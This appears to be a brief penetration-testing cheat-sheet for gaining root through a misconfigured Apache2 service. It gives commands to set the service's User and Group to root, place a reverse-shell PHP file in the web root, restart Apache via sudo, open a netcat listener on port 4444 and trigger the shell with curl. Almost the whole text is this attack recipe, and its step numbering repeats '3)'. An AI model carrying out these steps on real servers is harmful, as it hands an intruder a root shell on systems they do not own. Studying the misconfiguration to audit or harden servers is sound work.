# Apache2 Privilege Escalation

## Requirements: User can restart the apache2 server as root.

    sudo /bin/systemctl restart apache2

### 1) Check for misconfigurations on apache configuration files

Location

    /etc/apache2/apache.conf

### 2) If you have write access on the file, change the name and group of the user that runs the apache service to root (or any other legitimate user).

    # These need to be set in /etc/apache2/envars
    User root
    Group root

### 3) Upload a reverse shell to activate it as the user we changed on the config file upon restarting.

Upload to:

    /var/www/html/reverse-shell.php

### 3) Restart apache

    sudo /bin/systemctl restart apache2

### 4) Setup listener

    nc -lnvp 4444

### 5) Get your shell

    curl http://domain.local/reverse-shell.php
